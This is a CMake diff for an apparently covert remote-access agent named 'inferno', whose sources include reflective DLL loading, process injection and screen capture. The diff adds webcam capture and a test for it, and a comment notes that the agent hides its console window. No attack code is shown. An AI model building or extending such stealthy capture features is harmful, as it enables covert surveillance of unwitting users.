@@ -99,6 +99,7 @@ if(WIN32)
         client/src/NtApi.cpp
         client/src/ReflectiveLoader.cpp
         client/src/ScreenCapture.cpp
+        client/src/CameraCapture.cpp
     )
 else()
     target_sources(inferno_client PRIVATE client/src/MachInjector.cpp)
@@ -115,7 +116,7 @@ endif()
 
 if(WIN32)
     target_compile_definitions(inferno_client PRIVATE _CRT_SECURE_NO_WARNINGS)
-    target_link_libraries(inferno_client PRIVATE ws2_32 advapi32 user32 gdiplus)
+    target_link_libraries(inferno_client PRIVATE ws2_32 advapi32 user32 gdiplus mfplat mfreadwrite mfuuid)
     # Note: WIN32_EXECUTABLE is intentionally NOT set — the agent uses
     # FreeConsole() at runtime to hide the console window, keeping
     # standard main() as the entry point for cross-platform compatibility.
@@ -182,15 +183,15 @@ if(WIN32)
         client/src/NtApi.cpp
         client/src/ReflectiveLoader.cpp
         client/src/ScreenCapture.cpp
+        client/src/CameraCapture.cpp
     )
     target_include_directories(inferno_agent_dll PRIVATE client/include)
     target_compile_definitions(inferno_agent_dll PRIVATE INFERNO_DLL)
     target_compile_definitions(inferno_agent_dll PRIVATE _CRT_SECURE_NO_WARNINGS)
-    target_link_libraries(inferno_agent_dll PRIVATE inferno_common ws2_32 gdiplus)
+    target_link_libraries(inferno_agent_dll PRIVATE inferno_common ws2_32 gdiplus mfplat mfreadwrite mfuuid)
     set_target_properties(inferno_agent_dll PROPERTIES
         OUTPUT_NAME "inferno_agent"
     )
-
     add_executable(inferno_loader client/src/windows_loader.cpp)
     target_compile_definitions(inferno_loader PRIVATE _CRT_SECURE_NO_WARNINGS)
 
@@ -260,11 +261,13 @@ if(WIN32)
         client/src/entry_dll.cpp
         client/src/ReflectiveLoader.cpp
         client/src/ScreenCapture.cpp
+        client/src/CameraCapture.cpp
         tests/reflective_loader_test.cpp
         tests/windows_dll_test.cpp
         tests/wire_reflective_test.cpp
         tests/embedded_dll_test.cpp
         tests/screencapture_test.cpp
+        tests/cameracapture_test.cpp
     )
 else()
     target_sources(inferno_tests PRIVATE
@@ -291,7 +294,7 @@ if(WIN32)
     target_compile_definitions(inferno_tests PRIVATE
         TEST_BINARY_DIR="$<TARGET_FILE_DIR:inferno_agent_dll>"
     )
-    target_link_libraries(inferno_tests PRIVATE ws2_32 advapi32 user32 gdiplus)
+    target_link_libraries(inferno_tests PRIVATE ws2_32 advapi32 user32 gdiplus mfplat mfreadwrite mfuuid)
     target_sources(inferno_tests PRIVATE
         tests/windows_dll_test.cpp
     )
